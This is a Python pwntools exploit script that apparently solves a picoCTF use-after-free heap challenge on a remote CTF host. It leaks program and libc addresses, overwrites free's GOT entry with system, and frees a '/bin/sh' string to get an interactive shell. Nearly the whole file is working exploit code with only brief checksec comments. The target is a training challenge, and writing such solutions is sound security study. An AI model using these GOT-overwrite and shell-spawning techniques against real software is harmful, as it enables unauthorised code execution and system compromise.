#!/usr/bin/env python3
import sys
from pwn import *
context.log_level="debug"
import time
import os
#-----------------------------------------------------------
'''
checksec checks
NX ENABLED - NO SHELLCODE ON THE STACK CAN BE EXECUTED 
PIE ENABLED - THE POSITION KEEPS CHANGING IN THE CODE (POSITION INDEPENDENT EXECUTABLE)
PARTIAL RELRO- CAN READ ONLY A FEW BYTES ALTHOUGH NOT THAT IMPORTANT
#calling conventions
 RDI,RSI,RDX,RCX,R8,R7 ...
'''
#============================#============================#============================
gdb_script='''
vmmap
'''

path="./UAF-1"
def check():
	log.warning(os.system(f'file {path}'))
	log.warning(os.system(f'checksec {path}'))
	log.warning(os.system(f'ldd {path}'))

if os.path.exists("./flag.txt")==False:
	with open("flag.txt","w") as flag:
		flag.write("flag{pwned_m0T******}")
elf = context.binary=ELF(path,checksec=True)
HOST="saturn.picoctf.net"
PORT= 50266
context.binary = elf
libc=elf.libc
p=process(path)
argument=sys.argv[1]
if argument=="l":
    p=process(path)
if argument=="r":
	p=remote(HOST,PORT)



#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.strip().ljust(4, b'\0'))
uu64    = lambda data               :u64(data.strip().ljust(8, b'\0'))
ia 		= lambda 					: p.interactive()
rl 		= lambda 					: p.recvline()
#=======================================================================================
def send(payload):
	p.sendlineafter(":",payload.encode('utf-8'))
def send2(payload):
	sa("name:",payload)
def debug():
	gdb.attach(p,gdbscript=gdb_script)
send(str(2))
send("aaaaaaaa")
send(str(7))
send(str(1))
send(str(5))
ru("name is")
get_flag=uu64(rl().strip())
log.info(f"{hex(get_flag)=}")
elf.address=get_flag-elf.symbols.getFlag
log.info(f"{hex(elf.address)=}")
log.info(f"{hex(elf.got.free)=}")
send("6")
send('4')
send2(p64(elf.got.free))
send('1')
send('6')
send('2')
send2("/bin/sh\x00")
send('2')
send2("\x50")
send('5')
ru("name is")
leak=uu64(rl().strip())
print(hex(leak))
libc.address=leak-0x97950
log.info(f"{hex(libc.address)}")
system=libc.symbols.system
print(hex(system))
send('4')
send2(p64(libc.symbols.system))
send('6')
ia()